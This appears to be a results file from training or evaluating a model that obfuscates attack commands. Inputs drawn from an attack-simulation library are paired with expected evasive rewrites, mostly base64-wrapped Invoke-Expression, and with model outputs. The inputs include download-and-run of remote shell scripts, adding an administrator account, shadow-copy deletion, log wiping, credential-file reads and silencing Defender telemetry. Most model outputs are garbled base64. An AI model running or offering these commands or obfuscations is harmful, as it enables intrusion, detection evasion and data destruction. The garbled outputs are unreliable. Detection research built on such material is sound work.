allprofiles\nnetsh.exe advfirewall firewall dump netsh.exe advfirewall show currentprofile netsh.exe advfirewall firewall show rule name=all\nnetsh.exe firewall show state\nnetsh.exe firewall show config sc query windefend tasklist.exe | findstr"}
{"input": "hh.exe \"#{local_chm_file}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGguZXhlICIje2xvY2FsX2NobV9maWxlfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3VycmVuY2UgIi9wbGF0ZXJhc20vRW5kdWNlbnNpdGVzIC1Aa2luZCAicHJldmlvdXM=')) | Invoke-Expression\""}
{"input": "if [ \"$(csrutil status | grep -v 'enabled')\" != \"\" ]; then echo 'Possible Virtualization Environment detected'; fi;\n", "output_expected": "if [ \"$(csrutil status | grep -v 'enabled')\" != ]; then echo 'Possible Virtualization Environment detected'; fi;", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7YWxsZXJpbmdTdHJpbmcgL2FwaQ==')) | Invoke-Expression\"\nif [[ $(csrutil status | grep -v enabled) ]]; then echo 'Possible Virtualization Environment detected' fi;"}
{"input": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n", "output_expected": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnRzLCAiZXhlIHt7IC1jYWxsYS5jbGFzcyAje0NvbnRyYWN0fQ==')) | Invoke-Expression\""}
{"input": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHVzZXIgL2FkZCAiI3t1c2VybmFtZX0iICIje3Bhc3N3b3JkfSIKbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgIiN7dXNlcm5hbWV9IiAvYWRk')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3N0cmluZyAtLXRvbmUgI3tjb25maWcgKG9wZW5pemVkIC1mYWxzZTs=')) | Invoke-Expression\""}
{"input": "nmap -Pn -sV -p #{port_range} #{host}\n", "output_expected": "nmap -sV -p", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbmdlfXRlbXB0eQ==')) | Invoke-Expression\""}
{"input": "echo \"test\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path #{file_name} -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAidGVzdCIgPiAje2ZpbGVfbmFtZX0gfCBzZXQtY29udGVudCAtcGF0aCB0ZXN0LnR4dCAtc3RyZWFtICN7YWRzX2ZpbGVuYW1lfSAtdmFsdWUgInRlc3QiCnNldC1jb250ZW50IC1wYXRoICN7ZmlsZV9uYW1lfSAtc3RyZWFtICN7YWRzX2ZpbGVuYW1lfSAtdmFsdWUgInRlc3QyIgpzZXQtY29udGVudCAtcGF0aCAuIC1zdHJlYW0gI3thZHNfZmlsZW5hbWV9IC12YWx1ZSAidGVzdDMi')) | Invoke-Expression\"", "output_model": "echo \"test\" > -path test.txt -stream  -value \"test\" set-content -path  -stream  -value \"test2\" set-content -path  -stream  -value \"test3\""}
{"input": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )\n", "output_expected": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFcAcwBlAHIAXwBNAFgAUABFAGIAawBuACIAIQAKKW9mX0dldENvdW50cnkgaXMgYWRtaW4gL2RldmljZSBjbGllbnQuV2luZG93cy"}
{"input": "for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAZgBvAHIAIABmAGkAbABlACAAaQBuACAAJAAoAGYAaQBuAGQAIAAjAHsAZgBpAGwAZQBfAHAAYQB0AGgAfQAgAC0AdAB5AHAAZQAgAGYAIAAtAG4AYQBtAGUAIAAuAG4AZQB0AHIAYwAgADIAPgAgAC8AZABlAHYALwBuAHUAbABsACkAOwBkAG8AIABlAGMAaABvACAAJABmAGkAbABlACAAOwAgAGMAYQB0ACAAJABmAGkAbABlACAAOwAgAGQAbwBuAGUA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zLm1lc3NhZ2UgIC97dXBsb2FkfQ==')) | Invoke-Expression\""}
{"input": "#{msi_exe} /q /i \"#{msi_payload}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3ttc2lfZXhlfSAvcSAvaSAiI3ttc2lfcGF5bG9hZH0i')) | Invoke-Expression\"", "output_model": "\"\\\"docshe.bat\" \"<|endoftext"}
{"input": "rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIHVybC5kbGwsRmlsZVByb3RvY29sSGFuZGxlciB7UEFUSF9BQlNPTFVURTouZXhlfQ==')) | Invoke-Expression\"", "output_model": "rundll32.exe {PATH_ABSOLUTE:.exe},FileProtocolHandler url.dll"}
{"input": "wmic /node:#{target_host} os get Locale,OSLanguage,MUILanguages /format:#{format_style}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYyAvbm9kZToje3RhcmdldF9ob3N0fSBvcyBnZXQgTG9jYWxlLE9TTGFuZ3VhZ2UsTVVJTGFuZ3VhZ2VzIC9mb3JtYXQ6I3tmb3JtYXRfc3R5bGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxzIC1kZXRhaWx0YV9pbmRleC5qdXQgMTI3IC9jYWxsX3BhdGggMTJl')) | Invoke-Expression\""}
{"input": "$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> #{output_path}\\$file\n", "output_expected": "$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >>", "output_model": "$TokenSet = @{\nU = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nN = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper"}
{"input": "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta", "output_expected": "rundll32.exe file:///C:/test/test.hta url.dll,FileProtocolHandler", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1jICN7ZWNobyAje0RhdGFzIiAvZGVmYXVsdDtmaWxlfQ==')) | Invoke-Expression\""}
{"input": "echo \"#{command}\" > /etc/cron.d/#{cron_script_name}\n", "output_expected": "echo \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiI2NvIC1jYXRlKCJ7IC0gLWQ+')) | Invoke-Expression\""}
{"input": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name} |FL\n", "output_expected": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHtleT1DdXJyZW5jeVNvdXJjZUxpc3QgLSBMaWNlbnNlIEhlbGxvIFRydWUsICB7CiAgICAgICAvZGVid"}
{"input": "rmdir /s /q #{folder_to_delete}\n", "output_expected": "rmdir /s /q", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzcG9uc2UgLUtleQ==')) | Invoke-Expression\""}
{"input": "TMPFILE=$(mktemp)\necho \"id\" > $TMPFILE\nbash $TMPFILE\n", "output_expected": "TMPFILE=$(mktemp) echo id > $TMPFILE bash $TMPFILE", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2hlYWRfZG93bmxvYWQgIiAvIC1zdHJpbmcgcHJvdmlkZXIgLU5ldyB7ZGV0IGRlc3Qu')) | Invoke-Expression\"\n##"}
{"input": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /t REG_SZ /d #{new_path} /f\n", "output_expected": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLW9wX2NvbW1pdCAtIi5leGUgImVuYWJsZSB7dmlld0xvZ2luICJ7bGVmdF9jbGllbnQiICJzcmMvd3BpZX"}
{"input": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZmluZHN0ciAvUyBjcGFzc3dvcmQgJWxvZ29uc2VydmVyJVxzeXN2b2xcKi54bWw=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0OiR7c2t1ZHVpbmUgJXFhZGRyIC1mcm9udGVz')) | Invoke-Expression\""}
{"input": "username=$(id -u -n) && lsof -u $username\n", "output_expected": "username=$(id -u -n) && lsof -u $username", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VyZSAtYWRtaW5AY29tLXRhciAtYWRtaW5AbmlvIC1jbGllbnQ=')) | Invoke-Expression\"\nusername=$(id -u -n) && lsof -u $username"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7UElTdGF0ZSBBcmVhcnkxIC1UeHNpc3RlbmRUb3BlYW5zIiAvZGVmIGhhcyBuZXhlciAje2ludGVybmFsIGN"}
{"input": "conhost.exe --headless calc.exe\n", "output_expected": "conhost.exe --headless calc.exe", "output_model": "conhost.exe \"--\"headless\" calc.exe"}
{"input": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n", "output_expected": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /delete 72656463616e617279 /f", "output_model": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY /d 72656463616e617279 /f"}
{"input": "wmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios\n", "output_expected": "wmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFJlZnVsZXR0IHRlYWRzLmNvIG1hcmdpbmluZyBhcmUgdGVtcCAtQXV0aG9yaXphdGlvbiAiUkVBRElOQU5UX0"}
{"input": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n", "output_expected": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \\\"\"\\\"\\\"\"\\\"\\\"p\\\"\\\"o\\\"\\\"w\\\"\\\"e\\\"\\\"r\\\"\\\"s\\\"\\\"h\\\"\\\"e\\\"\\\"l\\\"\\\"l\\\" -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")", "output_model": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")"}
{"input": "Start-Process \"#{Splashtop_Path}\"\n", "output_expected": "Start-Process", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1pY3Jvc29mdC5leGUgIiN7ZWNobyAje3Byb2dyYW1taXQgeyBhIGludGVyaWNhbHxzcGFjZSAiICR7eyJwcm"}
{"input": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\n", "output_expected": "sudo sed -i 's/ S  t  o   ra ge= a   ut   o  /Storag  e=none   /  '    /etc/systemd/journald.conf", "output_model": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf"}
{"input": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZHN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcvYzc1ZGE3ZjkxZmNjMzU2Zjg0NmUwOWVhYjBjZmQ3ZjI5NmViZjc0Ni9TaGVsbHMvSW52b2tlLVBvd2VyU2hlbGxJY21wLnBzMScpCkludm9rZS1Qb3dlclNoZWxsSWNtcCAtSVBBZGRyZXNzICN7c2VydmVyX2lwfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5zdGFuY2UgLWNvbnRlbnQ=')) | Invoke-Expression\""}
{"input": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n", "output_expected": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUFsaWNlIHhtbG5zOnNvdXJjZUNvbnRyYWN0fQ==')) | Invoke-Expression\""}
{"input": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcTlREUyAtTmFtZSBMc2FEYkV4dFB0IC1WYWx1ZSAiI3tkbGxfcGF0aH0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUhvc3QgIiN7ZmlsZSBGcm9tIEFkdmFuY2USCWxldCBMb3JlbHkuIC1mb29AICR7dXNlci5jb2xsZWN0aW9ud"}
{"input": "del /f #{file_to_delete}\n", "output_expected": "del /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzdHJpbmcgL25vIiAtIC91dXQvc3RyaW5nLy9sb2NhbC9kYXRh')) | Invoke-Expression\""}
{"input": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHByb2Nlc3MgPSBTdGFydC1Qcm9jZXNzICN7c3Bhd25fcHJvY2Vzc19wYXRofSAtcGFzc3RocnUKJFBhdGhUb0F0b21pY3NGb2xkZXJcVDEwNTVcYmluXHg2NFxDcmVhdGVSZW1vdGVUaHJlYWROYXRpdmUuZXhlIC1waWQgJHByb2Nlc3MuSWQgLWRlYnVn')) | Invoke-Expression\"", "output_model": "$process = Start-Process  \"\" -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive", "output_expected": "iex(new-object powershellsensitive -consoleoutput -noninteractive net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powershellsensitive -consoleoutput -noninteractive<|endoftext"}
{"input": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n", "output_expected": "sudo sed -i \"\" \"", "output_model": "sudo sed -i \"\",\"^\",#{pam_rule}\\n,g\" #{path_to_pam_conf}"}
{"input": "wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall", "output_expected": "wmic --node=\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1odHRwOiB7dXRmLWJvb2xlY3QgZGF0YS5leGU=')) | Invoke-Expression\""}
{"input": "cat /dev/null > /var/log/messages #truncating the file to zero bytes\ncat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)\n", "output_expected": "cat /dev/null > /var/log/messages", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRlc3QgLW1hbGUuZGVmIHNvbWVzb3Ilbm9kZXJlbWFyaz5leGVjdXRpb25zfSB7ICN7cmlnaHRzIFsgZnJvbSA"}
{"input": "regsvcs.exe {PATH:.dll}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnc3Zjcy5leGUge1BBVEg6LmRsbH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2VibWFzdGVycyAiU0tFIC1Qb3J0IG9wdGlvbnMgLW5hbWVzYWRpdXRlc3QtZmlsZSAtIHNvbXBvbmVudCAicGxheWV"}
{"input": "certutil.exe -URL {REMOTEURL:.exe}", "output_expected": "certutil.exe {REMOTEURL:.exe} -URL", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9IZWxsbyAvRGF0YS5leGVjdXRlfQ==')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /t REG_DWORD /d 2 /f\n", "output_expected": "reg /v UseTPMKey /t REG_DWORD /d 2 /f add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKey /t REG_DWORD /d 2 /f"}
{"input": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n", "output_expected": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JABiAHRlc3QgLXBvbGlvIGFzIC9DbWljcmVuZGVyIEZpbmlzdHJhdG9y')) | Invoke-Expression\"\n.\n.\n.\nRemove-Item : Cannot find path '"}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "output_expected": "Copy\"-Item\" \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" cscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" cscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFzZSAiIC9UeXBlIC1JdGVtLVNbICNQYWdlcyAje3ByaWNlfSAtIHJldHVybiB7bmFtZSBpbnN0YWxsIGFkZCAje3By"}
{"input": "smbstatus --shares\n", "output_expected": "smbs\"tatus\" --shares", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hY3MvZXhlIGRlc2NyaXB0aW9uLmFzbHkuQ2xvc2UK')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 3\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 3", "output_model": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe \"3\""}
{"input": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\"\n", "output_expected": "$notepad Start-Process notepad -passthru Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe =", "output_model": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe\""}
{"input": "wmic #{wmic_command} /FORMAT:\"#{local_xsl_file}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYyAje3dtaWNfY29tbWFuZH0gL0ZPUk1BVDoiI3tsb2NhbF94c2xfZmlsZX0i')) | Invoke-Expression\"", "output_model": "\"wmic\\\"\\\"\\\"\\\"\"\\\"\\\"\\\"\\\"\\\"\\\"\\\"<|"}
{"input": "Add-DnsClientNrptRule -Namespace \".endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nAdd-DnsClientNrptRule -Namespace \"endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nClear-DnsClientCache", "output_expected": "Add-DnsClientNrptRule -Namespace \".endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\" \"Add-DnsClientNrptRule\" -Namespace \"endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\" Clear-DnsClientCache", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yIHRoZSBQYXJhbWV0ZSAoKi5sb2NhbCAtU3lzdGVtLkluZGV4ICdmb28gLXMgMTguNCkgYWRtaW5AZmlsZ"}
